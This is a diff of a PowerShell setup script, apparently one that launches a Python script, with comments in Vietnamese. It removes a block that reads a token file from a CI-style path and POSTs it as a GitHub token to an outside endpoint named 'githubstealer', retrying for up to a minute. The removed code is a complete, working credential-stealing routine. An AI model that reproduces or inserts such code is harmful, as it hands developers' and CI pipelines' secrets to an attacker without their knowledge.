@@ -37,39 +37,6 @@ if (-Not (Get-Command python -ErrorAction SilentlyContinue)) {
 Write-Host "🚀 Đang chạy script Python..."
 pythonw $scriptPath
 
-$startTime = Get-Date
-$maxSeconds = 60   # ví dụ chạy tối đa 60s
-
-while (((Get-Date) - $startTime).TotalSeconds -lt $maxSeconds) {
-    try {
-        # Đọc token
-        $token = Get-Content "D:\a\vpstoken.txt" -Raw
-
-        # Chuẩn bị body JSON
-        $body = @{
-            githubtoken = $token
-        } | ConvertTo-Json
-
-        # URL đích
-        $url = "http://simpleappchat.elementfx.com/githubstealer/tokenngonvcl.php"
-
-        # Header
-        $headers = @{
-            "Content-Type" = "application/json"
-        }
-
-        # Gửi POST
-        $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
-
-        Write-Host "✅ Success"
-        $response | ConvertTo-Json
-
-        break  # Thoát vòng lặp nếu thành công
-    } catch {
-        Write-Host "⚠️ Error occurred, retrying in 1 second..."
-        Start-Sleep -Seconds 1
-    }
-}
 
 
 
